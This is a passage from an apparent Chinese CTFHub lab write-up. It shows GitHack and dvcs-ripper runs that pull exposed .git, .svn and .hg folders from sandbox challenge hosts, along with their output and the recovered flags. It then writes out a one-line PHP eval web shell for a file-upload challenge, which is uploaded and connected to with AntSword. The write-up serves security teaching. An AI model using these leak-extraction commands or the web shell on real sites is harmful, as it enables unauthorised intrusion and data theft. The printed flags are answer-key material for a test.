punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/b5/aa9e47f5f2a2b02e23da913c5137976e36a716<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/f6b210fccb96c831fb0149bd777d02f2fdc5b9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/9d/aceca66ad6be96b31ab966d60ca6e6beb02ebb<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/ba/69d13b39c28abea7f0f7865d83d8cb6aa83b10<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/ac/48499ac2bda260e59471019e8506a71980f5a2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后进入到响应的文件夹查看git log</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> dist/challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>运行得到的结果如下</p><pre class="line-numbers language-bash"><code class="language-bash">commit b5aa9e47f5f2a2b02e23da913c5137976e36a716 <span class="token punctuation">(</span>HEAD -<span class="token operator">></span> master<span class="token punctuation">)</span>Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>Date:   Sun Mar 15 12:54:22 2020 +0000    remove flagcommit 90f6b210fccb96c831fb0149bd777d02f2fdc5b9Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>Date:   Sun Mar 15 12:54:22 2020 +0000    add flagcommit ba69d13b39c28abea7f0f7865d83d8cb6aa83b10Author: CTFHub <span class="token operator">&lt;</span>sandbox@ctfhub.com<span class="token operator">></span>Date:   Sun Mar 15 12:54:22 2020 +0000    init<span class="token punctuation">(</span>END<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当前所处的版本为 <code>remove flag</code>，flag 在 <code>add flag</code>，我们就要切换版本</p><pre class="line-numbers language-bash"><code class="language-bash">➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> reset --hard 90f6HEAD is now at 90f6b21 add flag➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ lltotal 0-rwxrwxrwx 1 kali kali  49 Mar 15 21:05 298682056511664.txt-rwxrwxrwx 1 kali kali 494 Mar 15 21:05 50x.html-rwxrwxrwx 1 kali kali 143 Mar 15 21:05 index.html➜  challenge-426b1b2da4ddd315.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 298682056511664.txtctfhub<span class="token punctuation">{</span>f0aa23ed987f7f88905579799a5f7da12f6cc491<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-2、Stash"><a href="#4-2、Stash" class="headerlink" title="4.2、Stash"></a>4.2、Stash</h4><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/  ____ _ _   _   _            _ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span> \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span> A <span class="token string">'.git'</span> folder disclosure exploit.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CloneCloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.fatal: repository <span class="token string">'http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/'</span> not found<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-bcc954ebd1926525.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/67/6ee2ab05e4e9190d1eb94e035ad00b23e6db3d<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/a3/b071375bbc6d7315c553d28efc9ddd16c79cbe<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/8a/3f858443df92e83814ad7d6340c786c1dbafaf<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/0d/3c5e077dbbc36f7fc5fe0812c5d07173595749<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/e3/58b09f4cb4e5800dd20e1aa6758bf80811001a<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/06/36184b6082890f325e44990c6805a70f1dd06b<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2d/78a2c68cc4d62aac1d07f4321a7d0385e026a6<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/e0/8222e5d2f251eb14754ed3b40d9a1ef2f639ed<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/6c/dfa192a6458d5c5611fe5eb44338b77d712bf2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> dist/challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> stash liststash@<span class="token punctuation">{</span>0<span class="token punctuation">}</span>: WIP on master: a3b0713 add flag<span class="token comment" spellcheck="true">#可以看到栈中有内容，直接弹出</span>➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">git</span> stash popCONFLICT <span class="token punctuation">(</span>modify/delete<span class="token punctuation">)</span>: 2677036325324.txt deleted <span class="token keyword">in</span> Updated upstream and modified <span class="token keyword">in</span> Stashed changes. Version Stashed changes of 2677036325324.txt left <span class="token keyword">in</span> tree.The stash entry is kept <span class="token keyword">in</span> <span class="token keyword">case</span> you need it again.➜  challenge-bcc954ebd1926525.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 2677036325324.txtctfhub<span class="token punctuation">{</span>69ad3cdc7bae528787ead797f0ce24c24a2613fc<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-3、index"><a href="#4-3、index" class="headerlink" title="4.3、index"></a>4.3、index</h4><p>​        当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master python GitHack.py http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git  ____ _ _   _   _            _ / ___<span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>  _<span class="token operator">|</span> <span class="token operator">|</span> __<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>  _  <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span> \____<span class="token operator">|</span>_<span class="token operator">|</span>\__<span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span>\__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\<span class="token punctuation">{</span>0.0.5<span class="token punctuation">}</span> A <span class="token string">'.git'</span> folder disclosure exploit.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Check Depends<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Check depends end<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Set Paths<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Target Url: http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Target<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone straightly<span class="token punctuation">[</span>*<span class="token punctuation">]</span> CloneCloning into <span class="token string">'/mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080'</span><span class="token punctuation">..</span>.fatal: repository <span class="token string">'http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/'</span> not found<span class="token punctuation">[</span>-<span class="token punctuation">]</span> Clone Error<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to Clone with Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> http://challenge-858daa56ad3a890b.sandbox.ctfhub.com:10080/.git/ is not support Directory Listing<span class="token punctuation">[</span>-<span class="token punctuation">]</span> <span class="token punctuation">[</span>Skip<span class="token punctuation">]</span><span class="token punctuation">[</span>First Try<span class="token punctuation">]</span> Target is not support Directory Listing<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Try to clone with Cache<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize Git<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Cache files<span class="token punctuation">[</span>*<span class="token punctuation">]</span> packed-refs<span class="token punctuation">[</span>*<span class="token punctuation">]</span> config<span class="token punctuation">[</span>*<span class="token punctuation">]</span> HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> COMMIT_EDITMSG<span class="token punctuation">[</span>*<span class="token punctuation">]</span> ORIG_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> FETCH_HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> index<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/HEAD<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/heads/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/28/24e1bbf84973508284fdb7e401b068d36ee5e9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/f4/a95a1573c72e0ac3be354b13e7f7707d730384<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/be/0651e066fd7424d5469d34872219d0750469f9<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/26/3f2708ef410c0e91c4bd6985ecaedd2a4a04c7<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5<span class="token punctuation">[</span>*<span class="token punctuation">]</span> objects/2c/59e3024e3bc350976778204928a21d9ff42d01<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Fetch Commit Objects End<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/remote/master<span class="token punctuation">[</span>*<span class="token punctuation">]</span> logs/refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> refs/stash<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Valid Repository<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid Repository Success<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Clone Success. Dist File <span class="token keyword">:</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看一下就得到flag了</p><pre class="line-numbers language-bash"><code class="language-bash">➜  GitHack-master <span class="token function">cd</span> /mnt/c/Users/BinSec/Downloads/Compressed/GitHack-master/GitHack-master/dist/challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080➜  challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ lltotal 0-rwxrwxrwx 1 kali kali  49 Mar 15 20:50 213531131228420.txt-rwxrwxrwx 1 kali kali 494 Mar 15 20:50 50x.html-rwxrwxrwx 1 kali kali 143 Mar 15 20:50 index.html➜  challenge-858daa56ad3a890b.sandbox.ctfhub.com_10080 git:<span class="token punctuation">(</span>master<span class="token punctuation">)</span> ✗ <span class="token function">cat</span> 213531131228420.txtctfhub<span class="token punctuation">{</span>8e1d7681a1a66c8b74d5a1b20b3a6b0d920589e2<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、SVN"><a href="#5、SVN" class="headerlink" title="5、SVN"></a>5、SVN</h3><p>​        当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">➜  dvcs-ripper-master <span class="token function">sudo</span> perl rip-svn.pl -u http://challenge-c523a500b40f2829.sandbox.ctfhub.com:10080/.svn/<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Found new SVN client storage format<span class="token operator">!</span>REP INFO <span class="token operator">=</span><span class="token operator">></span> 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Trying to revert the tree, <span class="token keyword">if</span> you get error, upgrade your SVN client<span class="token operator">!</span>Reverted <span class="token string">'index.html'</span>➜  dvcs-ripper-master ll -atotal 80Kdrwxrwxrwx 1 kali kali 4.0K Mar 15 21:24 <span class="token keyword">.</span>drwxrwxrwx 1 kali kali 4.0K Mar 15 21:21 <span class="token punctuation">..</span>-rwxrwxrwx 1 kali kali  149 Oct 22  2018 .gitignore-rwxrwxrwx 1 kali kali 3.8K Oct 22  2018 hg-decode.pl-rwxrwxrwx 1 kali kali  221 Mar 15 21:24 index.html-rwxrwxrwx 1 kali kali  18K Oct 22  2018 LICENSE-rwxrwxrwx 1 kali kali 5.5K Oct 22  2018 README.md-rwxrwxrwx 1 kali kali 6.3K Oct 22  2018 rip-bzr.pl-rwxrwxrwx 1 kali kali 4.7K Oct 22  2018 rip-cvs.pl-rwxrwxrwx 1 kali kali  15K Oct 22  2018 rip-git.pl-rwxrwxrwx 1 kali kali 6.0K Oct 22  2018 rip-hg.pl-rwxrwxrwx 1 kali kali 6.1K Oct 22  2018 rip-svn.pldrwxrwxrwx 1 kali kali 4.0K Mar 15 21:24 .svn<span class="token comment" spellcheck="true">#发现生成了.svn这个目录，可以继续查看</span>➜  dvcs-ripper-master tree .svn.svn├── entries├── <span class="token function">format</span>├── pristine│   ├── bf│   │   └── bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-base│   └── c4│       └── c4b3e18fe09fc3a63ec12c483c84012537bb5f2c.svn-base├── text-base├── tmp├── wc.db└── wc.db-journal➜  pristine <span class="token function">cat</span> c4/c4b3e18fe09fc3a63ec12c483c84012537bb5f2c.svn-base bf/bf45c36a4dfb73378247a6311eac4f80f48fcb92.svn-basectfhub<span class="token punctuation">{</span>1be4627619f2fd32babf97c15c0c93b1ce342934<span class="token punctuation">}</span><span class="token operator">&lt;</span>html<span class="token operator">></span><span class="token operator">&lt;</span>head<span class="token operator">></span>    <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string">"UTF-8"</span> /<span class="token operator">></span>    <span class="token operator">&lt;</span>title<span class="token operator">></span>CTFHub 信息泄露 SVN<span class="token operator">&lt;</span>/title<span class="token operator">></span><span class="token operator">&lt;</span>/head<span class="token operator">></span><span class="token operator">&lt;</span>body<span class="token operator">></span>    <span class="token operator">&lt;</span>h1<span class="token operator">></span>信息泄露 - Subversion<span class="token operator">&lt;</span>/h1<span class="token operator">></span>    <span class="token operator">&lt;</span>br/<span class="token operator">></span>    <span class="token operator">&lt;</span>p<span class="token operator">></span>Flag 在服务端旧版本的源代码中<span class="token operator">&lt;</span>/p<span class="token operator">></span><span class="token operator">&lt;</span>/body<span class="token operator">></span><span class="token operator">&lt;</span>/html<span class="token operator">></span>%<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到了flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>1be4627619f2fd32babf97c15c0c93b1ce342934<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6、HG泄露"><a href="#6、HG泄露" class="headerlink" title="6、HG泄露"></a>6、HG泄露</h3><p>​        当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p><pre class="line-numbers language-bash"><code class="language-bash">  dvcs-ripper-master <span class="token function">sudo</span> perl rip-hg.pl -u http://challenge-cf7c8f19e3e86d74.sandbox.ctfhub.com:10080/.hg/<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Getting correct 404 responses<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Finished <span class="token punctuation">(</span>2 of 12<span class="token punctuation">)</span>➜  dvcs-ripper-master <span class="token function">cd</span> .hg➜  .hg tree<span class="token keyword">.</span>├── 00changelog.i├── dirstate├── last-message.txt├── requires├── store│   ├── 00changelog.i│   ├── 00manifest.i│   ├── data│   │   ├── 50x.html.i│   │   └── index.html.i│   ├── fncache│   └── undo├── undo.branch├── undo.desc├── undo.dirstate└── wcache    ├── checklink -<span class="token operator">></span> checklink-target    └── checklink-target3 directories, 15 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash">➜  .hg <span class="token function">cat</span> store/*or��������� <span class="token punctuation">(</span>               ���$<span class="token operator">!</span>�<span class="token operator">|</span>���M�x�-�Akx�ɻtv����e�����<span class="token operator">!</span>β�^:<span class="token string">"(��_I,�B֋R�F�-kD�H;���;��J�9��T�����uH{'�!�hM�TRY�5���>��1@�>_�/X�LDDa��^�A�PS��|���=�ȠXrI   �9)5����x!(�!��}��|���۰����Iz}�&lt;I������u�����nw�>���n                                                                                                   ������"</span> Yf��������H�tw�����m'�Ȉ�*x�-�1�@�<span class="token operator">></span>�@<span class="token punctuation">)</span>-<span class="token operator">&lt;</span>�M������x�1<span class="token operator">&lt;</span>�v�Ǣ�2K<span class="token punctuation">)</span><span class="token punctuation">{</span>�Z3�s�<span class="token operator">&amp;</span>ӱfA����?6<span class="token punctuation">[</span>�B�                                                                               6�Ta�<span class="token punctuation">(</span>��1$�Ü*YI�����<span class="token punctuation">;</span><span class="token punctuation">]</span>xf$�<span class="token operator">|</span>��z����uX�T22<span class="token operator">=</span>flag_1027926131.txt52ec47b45f42236237d78a46be594c753f4754c7cat: store/data: Is a directorydata/index.html.idata/50x.html.idata/flag_1027926131.txt.idata/flag_1027926131.txt.i000manifest.i15300changelog.i175<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用命令</p><pre class="line-numbers language-bash"><code class="language-bash">➜  .hg curl http://challenge-cf7c8f19e3e86d74.sandbox.ctfhub.com:10080/flag_1027926131.txtctfhub<span class="token punctuation">{</span>7858c2fb14bc35af6870bfecaa93fce0a4e7269b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="二、文件上传"><a href="#二、文件上传" class="headerlink" title="二、文件上传"></a>二、文件上传</h2><h3 id="1、无验证"><a href="#1、无验证" class="headerlink" title="1、无验证"></a>1、无验证</h3><img src="https://s1.ax1x.com/2020/04/08/GfaZsH.png"><p>先编写一句话木马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'vale'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>因为这个题目时没有验证，所以可以直接上传</p><img src="https://s1.ax1x.com/2020/04/08/GfaFJK.png"><p>然后得到了路径，这里使用蚁剑连接</p><img src="https://s1.ax1x.com/2020/04/08/GfaAzD.png"><p>点击添加之后就能看到可以连接了</p><img src="https://s1.ax1x.com/2020/04/08/Gfaii6.png"><p>然后向上级目录查找</p><img src="https://s1.ax1x.com/2020/04/08/GfaCIx.png"><p>得到flag文件，打开即可获取flag</p><pre class="line-numbers language-bash"><code class="language-bash">ctfhub<span class="token punctuation">{</span>85c40de2fe2b5475d81dd2a491600ae533a3602c<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2、前端验证"><a href="#2、前端验证" class="headerlink" title="2、前端验证"></a>2、前端验证</h3><p>​    这里题目提示是有前端验证的</p><img src="https://s1.ax1x.com/2020/04/08/GfaeLd.png"><p>然后我们先提交一个1.php，看看响应是什么</p><img src="https://s1.ax1x.com/2020/04/08/GfaneA.png"><p>这里直接得到了一个允许上传的提示，查看一下源代码</p><pre class="line-numbers language-javascript"><code class="language-javascript"> <span class="token keyword">var</span> whitelist<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token string">".jpg"</span><span class="token punctuation">,</span><span class="token string">".png"</span><span class="token punctuation">,</span><span class="token string">".gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" 